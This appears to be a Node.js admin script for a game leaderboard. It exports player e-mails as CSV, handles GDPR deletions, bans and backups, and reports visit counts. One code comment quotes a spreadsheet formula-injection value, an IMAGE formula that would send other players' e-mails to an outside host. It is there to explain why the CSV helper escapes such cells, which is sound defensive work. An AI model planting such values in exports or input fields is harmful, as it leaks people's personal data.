// Admin tool – run on the server, next to the database. E-mails are only
// available here, never through the web API.
//
//   node admin.js top 10              best players with e-mails (CSV) – the winners
//   node admin.js delete email@x.cz   delete a player and all their data (GDPR request)
//   node admin.js ban email@x.cz      out of the leaderboard, runs not counted, no signing in again (unban: back)
//   node admin.js flagged 20          refused runs (score impossible in that time)
//   node admin.js all                 every player with e-mail (CSV), in order of signing up
//   node admin.js count               number of registered players
//   node admin.js backup zaloha.db    copy of the database (works while the server runs)
//   node admin.js visits 7            the page's visits per day (counts only – no one's data)
'use strict';
const path = require('node:path');
const { openDb } = require('./db');

const db = openDb(process.env.DB_PATH || path.join(__dirname, 'leaderboard.db'));
const [cmd, arg] = process.argv.slice(2);
// (a cell starting with = + - @ is a formula in Excel / Google Sheets – and the e-mail is whatever the player
// typed, e.g. =IMAGE("https://x.cz/?"&B3)@x.cz would send the others' e-mails away: a ' in front makes it text)
const csv = v => {
  const s = /^[=+\-@\t\r]/.test(String(v)) ? "'" + v : String(v);
  return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
};

switch (cmd) {
  case 'top': {
    console.log('rank,nickname,email,score,reached_at');
    db.winners(Number(arg) || 10).forEach((p, i) =>
      console.log([i + 1, p.nickname, p.email, p.best, p.best_at].map(csv).join(',')));
    break;
  }
  case 'delete': {
    if (!arg) { console.error('Usage: node admin.js delete email@example.com'); process.exit(1); }
    const n = db.deleteByEmail(arg);
    console.log(n ? `Deleted ${arg} and their runs.` : `No player with e-mail ${arg}.`);
    break;
  }
  case 'ban':
  case 'unban': {
    if (!arg) { console.error(`Usage: node admin.js ${cmd} email@example.com`); process.exit(1); }
    const n = db.setBanned(arg, cmd === 'ban');
    console.log(n ? `${cmd === 'ban' ? 'Banned' : 'Unbanned'} ${arg}.` : `No player with e-mail ${arg}.`);
    break;
  }
  case 'flagged': {
    console.log('nickname,email,score,seconds');
    db.flagged(Number(arg) || 20).forEach(r => console.log([r.nickname, r.email, r.score, r.seconds.toFixed(1)].map(csv).join(',')));
    break;
  }
  case 'backup': {
    if (!arg) { console.error('Usage: node admin.js backup zaloha.db'); process.exit(1); }
    db.backupTo(arg);
    console.log('Saved ' + arg);
    break;
  }
  case 'all': {
    console.log('nickname,email,best_score,signed_up');
    db.everyone().forEach(p => console.log([p.nickname, p.email, p.best, p.created_at].map(csv).join(',')));
    break;
  }
  case 'count':
    console.log(db.count());
    break;
  case 'visits': {
    const days = Number(arg) || 7;
    const from = new Date(Date.now() - (days - 1) * 86_400_000).toLocaleDateString('sv-SE', { timeZone: 'Europe/Prague' });
    const byDay = new Map();
    for (const r of db.visits(from)) { if (!byDay.has(r.day)) byDay.set(r.day, []); byDay.get(r.day).push(r); }
    if (!byDay.size) console.log('No visits counted yet.');
    for (const [day, rows] of byDay) {
      const n = k => (rows.find(r => r.key === k) || { n: 0 }).n;
      const group = pre => rows.filter(r => r.key.startsWith(pre)).map(r => `${r.key.slice(pre.length)} ${r.n}`).join(', ') || '-';
      console.log(`${day}  views ${n('views')}  visitors ${n('unique')}  from the home screen ${n('homescreen')}`);
      console.log(`  from:    ${group('from:')}`);
      console.log(`  system:  ${group('os:')}`);
      console.log(`  device:  ${group('device:')}`);
    }
    break;
  }
  default:
    console.log('Commands: all | top [n] | delete <email> | ban <email> | unban <email> | flagged [n] | count | visits [days] | backup <file>');
}
